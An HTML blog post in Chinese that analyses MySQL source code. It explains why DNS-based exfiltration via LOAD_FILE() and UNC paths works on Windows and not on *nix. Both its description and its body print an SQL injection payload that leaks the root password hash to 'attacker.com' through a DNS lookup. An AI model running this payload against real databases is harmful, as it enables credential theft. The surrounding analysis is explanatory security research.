@@ -1,0 +1,354 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Windows/*nix下DNS传出注入数据的背后 | \\Johnis.online\BLOG</title>
+  <meta name="author" content="LonelyRain">
+  
+  <meta name="description" content="几天前和朋友在测试一个注入，想要使用MySQL通过load_file()函数，再由DNS查询传出注入出来的数据时候遇到的问题
+以下语句1SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.attacker.com\\foobar&#39;));
+只有Windows + MySQL才能成功通过DNS查询包传出我们想要的数据
+而在*nix + MySQL环境下是无法成功的。
+（大家可以试试）
+这是为什么呢，我探究了一下背后的原理">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Windows/*nix下DNS传出注入数据的背后"/>
+  <meta property="og:site_name" content="\\Johnis.online\BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/old/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/old/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="/old//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/old/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/old/">\\Johnis.online\BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/old/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Windows/*nix下DNS传出注入数据的背后</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>几天前和朋友在测试一个注入，想要使用MySQL通过load_file()函数，再由DNS查询传出注入出来的数据时候遇到的问题</p>
+<p>以下语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.attacker.com\\foobar'</span>));</div></pre></td></tr></table></figure></p>
+<p>只有Windows + MySQL才能成功通过DNS查询包传出我们想要的数据</p>
+<p>而在*nix + MySQL环境下是无法成功的。</p>
+<p>（大家可以试试）</p>
+<p>这是为什么呢，我探究了一下背后的原理</p>
+<a id="more"></a>
+<p>MySQL load_file()函数相关的源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((file= mysql_file_open(key_file_loadfile,</div><div class="line">file_name-&gt;ptr(), O_RDONLY, MYF(<span class="number">0</span>))) &lt; <span class="number">0</span>)</div><div class="line"><span class="keyword">goto</span> err;</div></pre></td></tr></table></figure></p>
+<p>看一下mysql_file_open()这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> File</div><div class="line">inline_mysql_file_open(</div><div class="line">#ifdef HAVE_PSI_FILE_INTERFACE</div><div class="line">PSI_file_key key, <span class="keyword">const</span> <span class="keyword">char</span> *src_file, uint src_line,</div><div class="line">#endif</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flags, myf myFlags)</div><div class="line">&#123;</div><div class="line">File file;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_PSI_FILE_INTERFACE</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PSI_file_locker</span> *<span class="title">locker</span>;</span></div><div class="line">PSI_file_locker_state state;</div><div class="line">locker= PSI_FILE_CALL(get_thread_file_name_locker)</div><div class="line">(&amp;state, key, PSI_FILE_OPEN, filename, &amp;locker);</div><div class="line"><span class="keyword">if</span> (likely(locker != <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">PSI_FILE_CALL(start_file_open_wait)(locker, src_file, src_line);</div><div class="line">file= my_open(filename, flags, myFlags);</div><div class="line">PSI_FILE_CALL(end_file_open_wait_and_bind_to_descriptor)(locker, file);</div><div class="line"><span class="keyword">return</span> file;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">file= my_open(filename, flags, myFlags);</div><div class="line"><span class="keyword">return</span> file;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到my_open()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">File <span class="title">my_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *FileName, <span class="keyword">int</span> Flags, myf MyFlags)</span></span></div><div class="line"><span class="function"><span class="comment">/* Path-name of file */</span></span></div><div class="line"><span class="function"><span class="comment">/* Read | write .. */</span></span></div><div class="line"><span class="function"><span class="comment">/* Special flags */</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">File fd;</div><div class="line">DBUG_ENTER(<span class="string">"my_open"</span>);</div><div class="line">DBUG_PRINT(<span class="string">"my"</span>,(<span class="string">"Name: '%s'  Flags: %d  MyFlags: %d"</span>,</div><div class="line">FileName, Flags, MyFlags));</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_WIN32)</span></div><div class="line">fd= my_win_open(FileName, Flags);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">fd = open(FileName, Flags, my_umask);        <span class="comment">/* Normal unix */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">fd= my_register_filename(fd, FileName, FILE_BY_OPEN, EE_FILENOTFOUND, MyFlags);</div><div class="line">DBUG_RETURN(fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>最终可以看到在不同的环境有两种打开my_win_open(),open()</p>
+<p>继续追踪my_win_open()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div></pre></td><td class="code"><pre><div class="line"><span class="function">File <span class="title">my_win_sopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> oflag, <span class="keyword">int</span> shflag, <span class="keyword">int</span> pmode)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span>  fh;                                <span class="comment">/* handle of opened file */</span></div><div class="line"><span class="keyword">int</span> mask;</div><div class="line">HANDLE osfh;                            <span class="comment">/* OS handle of opened file */</span></div><div class="line">DWORD fileaccess;                       <span class="comment">/* OS file access (requested) */</span></div><div class="line">DWORD fileshare;                        <span class="comment">/* OS file sharing mode */</span></div><div class="line">DWORD filecreate;                       <span class="comment">/* OS method of opening/creating */</span></div><div class="line">DWORD fileattrib;                       <span class="comment">/* OS file attribute flags */</span></div><div class="line">SECURITY_ATTRIBUTES SecurityAttributes;</div><div class="line"></div><div class="line">DBUG_ENTER(<span class="string">"my_win_sopen"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (check_if_legal_filename(path))</div><div class="line">&#123;</div><div class="line">errno= EACCES;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line">SecurityAttributes.nLength= <span class="keyword">sizeof</span>(SecurityAttributes);</div><div class="line">SecurityAttributes.lpSecurityDescriptor= <span class="literal">NULL</span>;</div><div class="line">SecurityAttributes.bInheritHandle= !(oflag &amp; _O_NOINHERIT);</div><div class="line"></div><div class="line"><span class="comment">/* decode the access flags  */</span></div><div class="line"><span class="keyword">switch</span> (oflag &amp; (_O_RDONLY | _O_WRONLY | _O_RDWR)) &#123;</div><div class="line"><span class="keyword">case</span> _O_RDONLY:         <span class="comment">/* read access */</span></div><div class="line">fileaccess= GENERIC_READ;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _O_WRONLY:         <span class="comment">/* write access */</span></div><div class="line">fileaccess= GENERIC_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _O_RDWR:           <span class="comment">/* read and write access */</span></div><div class="line">fileaccess= GENERIC_READ | GENERIC_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:                <span class="comment">/* error, bad oflag */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode sharing flags */</span></div><div class="line"><span class="keyword">switch</span> (shflag) &#123;</div><div class="line"><span class="keyword">case</span> _SH_DENYRW:        <span class="comment">/* exclusive access except delete */</span></div><div class="line">fileshare= FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYWR:        <span class="comment">/* share read and delete access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRD:        <span class="comment">/* share write and delete access */</span></div><div class="line">fileshare= FILE_SHARE_WRITE | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYNO:        <span class="comment">/* share read, write and delete access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRWD:       <span class="comment">/* exclusive access */</span></div><div class="line">fileshare= <span class="number">0L</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYWRD:       <span class="comment">/* share read access */</span></div><div class="line">fileshare= FILE_SHARE_READ;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYRDD:       <span class="comment">/* share write access */</span></div><div class="line">fileshare= FILE_SHARE_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> _SH_DENYDEL:       <span class="comment">/* share read and write access */</span></div><div class="line">fileshare= FILE_SHARE_READ | FILE_SHARE_WRITE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:                <span class="comment">/* error, bad shflag */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode open/create method flags  */</span></div><div class="line"><span class="keyword">switch</span> (oflag &amp; (_O_CREAT | _O_EXCL | _O_TRUNC)) &#123;</div><div class="line"><span class="keyword">case</span> <span class="number">0</span>:</div><div class="line"><span class="keyword">case</span> _O_EXCL:                   <span class="comment">/* ignore EXCL w/o CREAT */</span></div><div class="line">filecreate= OPEN_EXISTING;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT:</div><div class="line">filecreate= OPEN_ALWAYS;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_EXCL:</div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_TRUNC | _O_EXCL:</div><div class="line">filecreate= CREATE_NEW;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_TRUNC:</div><div class="line"><span class="keyword">case</span> _O_TRUNC | _O_EXCL:        <span class="comment">/* ignore EXCL w/o CREAT */</span></div><div class="line">filecreate= TRUNCATE_EXISTING;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> _O_CREAT | _O_TRUNC:</div><div class="line">filecreate= CREATE_ALWAYS;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line"><span class="comment">/* this can't happen ... all cases are covered */</span></div><div class="line">errno= EINVAL;</div><div class="line">DBUG_RETURN(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* decode file attribute flags if _O_CREAT was specified */</span></div><div class="line">fileattrib= FILE_ATTRIBUTE_NORMAL;     <span class="comment">/* default */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_CREAT)</div><div class="line">&#123;</div><div class="line">_umask((mask= _umask(<span class="number">0</span>)));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!((pmode &amp; ~mask) &amp; _S_IWRITE))</div><div class="line">fileattrib= FILE_ATTRIBUTE_READONLY;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Set temporary file (delete-on-close) attribute if requested. */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_TEMPORARY)</div><div class="line">&#123;</div><div class="line">fileattrib|= FILE_FLAG_DELETE_ON_CLOSE;</div><div class="line">fileaccess|= DELETE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Set temporary file (delay-flush-to-disk) attribute if requested.*/</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_SHORT_LIVED)</div><div class="line">fileattrib|= FILE_ATTRIBUTE_TEMPORARY;</div><div class="line"></div><div class="line"><span class="comment">/* Set sequential or random access attribute if requested. */</span></div><div class="line"><span class="keyword">if</span> (oflag &amp; _O_SEQUENTIAL)</div><div class="line">fileattrib|= FILE_FLAG_SEQUENTIAL_SCAN;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (oflag &amp; _O_RANDOM)</div><div class="line">fileattrib|= FILE_FLAG_RANDOM_ACCESS;</div><div class="line"></div><div class="line"><span class="comment">/* try to open/create the file  */</span></div><div class="line"><span class="keyword">if</span> ((osfh= CreateFile(path, fileaccess, fileshare, &amp;SecurityAttributes,</div><div class="line">filecreate, fileattrib, <span class="literal">NULL</span>)) == INVALID_HANDLE_VALUE)</div><div class="line">&#123;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">OS call to open/create file failed! map the error, release</span></div><div class="line"><span class="comment">the lock, and return -1. note that it's not necessary to</span></div><div class="line"><span class="comment">call _free_osfhnd (it hasn't been used yet).</span></div><div class="line"><span class="comment">*/</span></div><div class="line">my_osmaperr(GetLastError());     <span class="comment">/* map error */</span></div><div class="line">DBUG_RETURN(<span class="number">-1</span>);                 <span class="comment">/* return error to caller */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((fh= my_open_osfhandle(osfh,</div><div class="line">oflag &amp; (_O_APPEND | _O_RDONLY | _O_TEXT))) == <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line">CloseHandle(osfh);</div><div class="line">&#125;</div><div class="line"></div><div class="line">DBUG_RETURN(fh);                   <span class="comment">/* return handle */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看到load_file()打开文件使用了Win32 API   CreateFile()函数</p>
+<p>CreateFile 在 MSDN 上的文档</p>
+<p>传送门</p>
+<p><code>https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx</code></p>
+<p>可以看到CreateFile()这个函数支持Universal  Naming Conventions(UNC)</p>
+<p>可以去访问远程的域名主机上的文件，在UNC中是支持域名进行远程主机访问的，既然要访问域名就必然进行DNS解析请求，从而传出数据。</p>
+<p>文档节选：<br><code>host-name: The host name of a server or the domain name of a domain hosting resource, using the syntax of IPv6address, IPv4address, and reg-name as specified in[RFC3986]</code></p>
+<p>假设MySQL源码里面Win32下用的是C标准库函数fopen()，那么我们就无法通过DNS查询包传送出来我们的数据。（最终都是调用到了CreateFile* 感谢zcgonvh）</p>
+<p>并且普通的*nix下是更加无法进行DNS查询，传出我们想要的数据的。</p>
+<p>因为仅仅用了一个普通的open()函数（这个函数是在另一个头里，我也进行了追踪，但是最后发现其实也只能打开本地文件）</p>
+<p>即使重新做了一个函数可以打开网络中的其他文件，没有类似UNC这背后的一套体系，这种注入出数据的手法也进行不下去。</p>
+<p>很佩服第一个想到用DNS来传送SQL注入的数据的人，他肯定是看了MySQL的源码，并且对Windows的API相当熟悉的人。</p>
+<p>Reference：<br><code>https://msdn.microsoft.com/en-us/library/gg465305.aspx
+https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx</code></p>
+<p>==============勘误===============<br>zcgonvh进行了调试，在Windows VC库函数中Fopen实际上最后调用的也是kernel32.dll里的CreateFile*这类Win32 API，所以必然也是支持自家的unc的。</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/old/2017/10/10/raindrop/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/old/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/old/2017/10/10/metinfo-include/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = '//lonelyrain-1.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="/old//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-10-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/old/categories/源码分析/">源码分析<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/old/tags/Windows/">Windows<span>1</span></a></li> <li><a href="/old/tags/DNS/">DNS<span>1</span></a></li> <li><a href="/old/tags/SQL注入/">SQL注入<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+var disqus_shortname = 'lonelyrain-1';
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2019 LonelyRain
+  
+</p>
+
+<script>
+  var disqus_shortname = 'lonelyrain-1';
+  
+  var disqus_url = 'http://cnlonelyrain.github.io/2017/10/10/Windows-DNS/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/old/js/jquery.imagesloaded.min.js"></script>
+<script src="/old/js/gallery.js"></script>
+<script src="/old/js/bootstrap.min.js"></script>
+<script src="/old/js/main.js"></script>
+<script src="/old/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/old/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/old/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "old/search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "old/search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
